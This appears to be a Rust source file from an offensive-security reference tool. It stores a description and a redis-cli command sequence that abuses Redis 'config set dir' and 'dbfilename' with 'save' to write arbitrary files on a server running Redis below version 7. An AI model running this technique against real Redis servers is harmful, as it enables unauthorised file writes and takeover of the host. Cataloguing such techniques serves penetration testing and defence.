pub static BIN_NAME: &'static str = "redis";
pub static BIN_DESC: &'static str = "This works with versions lower than 7.";
pub static FW_DESC: &'static str = "Write files on the server running Redis at the specified location. Written data will appear amongst the database dump, thus it might not be suitable for all kind of purposes.";
pub static FW_CODE: &'static str = r#"
    
    IP=127.0.0.1
    redis-cli -h $IP
    config set dir dir_to_write_to
    config set dbfilename file_to_write
    set x "DATA"
    save
"#;
use crate::code::{Code, Tag};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
